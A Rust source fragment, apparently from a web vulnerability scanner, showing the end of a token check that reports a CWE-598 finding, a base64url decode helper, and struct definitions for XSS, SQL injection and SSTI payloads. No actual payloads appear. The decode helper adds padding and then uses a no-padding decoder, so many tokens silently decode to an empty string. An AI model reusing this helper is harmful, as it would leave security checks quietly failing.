                            cwe: Some("CWE-598".to_string()),
                            owasp: Some("A02:2021 - Cryptographic Failures".to_string()),
                        });
                    }
                }
            }
            Err(_) => {}
        }

        Ok(report)
    }

    /// Helper function for base64url decode
    fn base64url_decode(input: &str) -> Result<String> {
        use base64::engine::general_purpose;
        use base64::Engine as _;

        // Add padding if needed for base64url
        let padded = match input.len() % 4 {
            0 => input.to_string(),
            2 => format!("{}==", input),
            3 => format!("{}=", input),
            _ => input.to_string(),
        };

        match general_purpose::URL_SAFE_NO_PAD.decode(&padded) {
            Ok(bytes) => Ok(String::from_utf8_lossy(&bytes).to_string()),
            Err(_) => {
                // Try with standard base64
                match general_purpose::STANDARD.decode(&padded) {
                    Ok(bytes) => Ok(String::from_utf8_lossy(&bytes).to_string()),
                    Err(_) => Ok("".to_string()),
                }
            }
        }
    }
}

// Supporting structures

#[derive(Debug)]
struct XssPayload {
    payload: &'static str,
    context: &'static str,
    signature: String,
}

#[derive(Debug)]
struct SqliPayload {
    payload: &'static str,
    technique: &'static str,
    pattern: &'static str,
    severity: VulnSeverity,
}

#[derive(Debug)]
struct SstiPayload {
    payload: &'static str,
    engine: &'static str,
    signature: &'static str,
}

#[derive(Debug)]
struct CspIssue {
    title: String,
    description: String,
    recommendation: String,
}
